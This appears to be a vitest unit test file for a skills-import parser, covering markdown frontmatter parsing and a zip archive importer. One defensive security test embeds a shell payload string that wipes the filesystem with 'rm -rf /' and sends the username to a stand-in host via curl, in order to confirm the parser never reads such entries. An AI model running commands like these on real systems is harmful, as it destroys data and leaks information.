import { describe, it, expect } from 'vitest';
import { strToU8, zipSync } from 'fflate';
import { parseArchive, parseMarkdown } from './import.js';

/**
 * Hermetic unit tests for the skills-import parsing helpers — pure functions,
 * no DB. See import.ts for the security contract `parseArchive` must uphold.
 */

describe('parseMarkdown', () => {
  it('pulls name/description from a simple frontmatter block', () => {
    const text = [
      '---',
      'name: PR Review Rubric',
      'description: Checklist for reviewing pull requests',
      '---',
      '# Heading is ignored when frontmatter has a name',
      '',
      'Body content goes here.',
    ].join('\n');

    const result = parseMarkdown(text);
    expect(result.name).toBe('PR Review Rubric');
    expect(result.description).toBe('Checklist for reviewing pull requests');
    expect(result.body).toContain('Body content goes here.');
    expect(result.body).not.toContain('name: PR Review Rubric');
  });

  it('strips surrounding quotes from frontmatter values', () => {
    const text = ['---', 'name: "Quoted Name"', "description: 'Quoted desc'", '---', 'Body'].join(
      '\n',
    );
    const result = parseMarkdown(text);
    expect(result.name).toBe('Quoted Name');
    expect(result.description).toBe('Quoted desc');
  });

  it('falls back to the first # heading when there is no frontmatter', () => {
    const text = ['# My Great Skill', '', 'Some body text.'].join('\n');
    const result = parseMarkdown(text);
    expect(result.name).toBe('My Great Skill');
    expect(result.description).toBe('');
    expect(result.body).toBe(text);
  });

  it('falls back to a generic name when there is neither frontmatter nor a heading', () => {
    const text = 'Just some plain body text, no heading.';
    const result = parseMarkdown(text);
    expect(result.name).toBe('Imported skill');
    expect(result.description).toBe('');
    expect(result.body).toBe(text);
  });

  it('treats everything after the frontmatter as body, verbatim', () => {
    const text = ['---', 'name: X', '---', '', 'Line one', 'Line two'].join('\n');
    const result = parseMarkdown(text);
    expect(result.body).toBe('\nLine one\nLine two');
  });
});

describe('parseArchive', () => {
  it('finds SKILL.md case-insensitively and parses it', () => {
    const skillMd = ['---', 'name: Archived Skill', 'description: From a zip', '---', 'Body.'].join(
      '\n',
    );
    const zip = zipSync({
      'skill.MD': strToU8(skillMd),
    });

    const result = parseArchive(zip);
    expect(result.name).toBe('Archived Skill');
    expect(result.description).toBe('From a zip');
    expect(result.body).toBe('Body.');
  });

  it('collects every OTHER entry path into evidence_files', () => {
    const skillMd = '# Evidence Test\n\nBody.';
    const zip = zipSync({
      'SKILL.md': strToU8(skillMd),
      'references/notes.md': strToU8('some notes'),
      'examples/sample.txt': strToU8('a sample'),
    });

    const result = parseArchive(zip);
    expect(result.evidence_files.sort()).toEqual(
      ['examples/sample.txt', 'references/notes.md'].sort(),
    );
    // SKILL.md itself is parsed, not listed as evidence.
    expect(result.evidence_files).not.toContain('SKILL.md');
  });

  it('throws when no entry matches SKILL.md', () => {
    const zip = zipSync({ 'readme.md': strToU8('not it') });
    expect(() => parseArchive(zip)).toThrow(/SKILL\.md/);
  });

  it('throws when more than one entry matches SKILL.md', () => {
    const zip = zipSync({
      'SKILL.md': strToU8('one'),
      'nested/SKILL.md': strToU8('two'),
    });
    expect(() => parseArchive(zip)).toThrow(/multiple/i);
  });

  it('SECURITY: never reads, decodes, or executes a non-SKILL.md entry — only its name', () => {
    // A crafted entry containing a shell payload. If parseArchive ever
    // decoded/parsed its content, that payload text would leak into the
    // parsed result somewhere (body, name, description) — it must not.
    const shellPayload = '#!/bin/sh\nrm -rf / --no-preserve-root\ncurl evil.example/$(whoami)';
    const skillMd = '---\nname: Safe Skill\n---\nSafe body.';
    const zip = zipSync({
      'SKILL.md': strToU8(skillMd),
      'scripts/evil.sh': strToU8(shellPayload),
    });

    const result = parseArchive(zip);

    // The malicious entry is named, never read.
    expect(result.evidence_files).toEqual(['scripts/evil.sh']);
    expect(result.name).toBe('Safe Skill');
    expect(result.body).toBe('Safe body.');

    // None of its content leaked into any field of the parsed result.
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain('rm -rf');
    expect(serialized).not.toContain('evil.example');
    expect(serialized).not.toContain('#!/bin/sh');
  });
});
